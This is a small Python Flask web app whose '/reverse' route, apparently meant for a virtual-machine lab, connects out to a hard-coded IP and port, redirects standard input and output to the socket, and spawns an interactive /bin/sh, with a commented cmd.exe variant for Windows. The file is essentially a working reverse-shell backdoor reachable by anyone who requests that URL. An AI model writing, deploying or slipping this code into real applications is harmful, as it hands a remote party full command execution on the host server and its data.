from flask import Flask, redirect
from flask import render_template
import socket, subprocess, os

app = Flask(__name__)

@app.route('/')
def home():
	return render_template('index.html')
	
@app.route('/reverse')
def reverse_shell():
    # Replace with your VM's IP
    ip = '10.0.2.15' 
    port = 8080
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    
    # -i provides an interactive shell
    p = subprocess.call(["/bin/sh", "-i"])
    #p = subprocess.call(["cmd.exe"])  -> For windows cmd access.
    return redirect('/')
	
if __name__ == "__main__":
	app.run(host="0.0.0.0", port=5000, debug=False, threaded=False)

	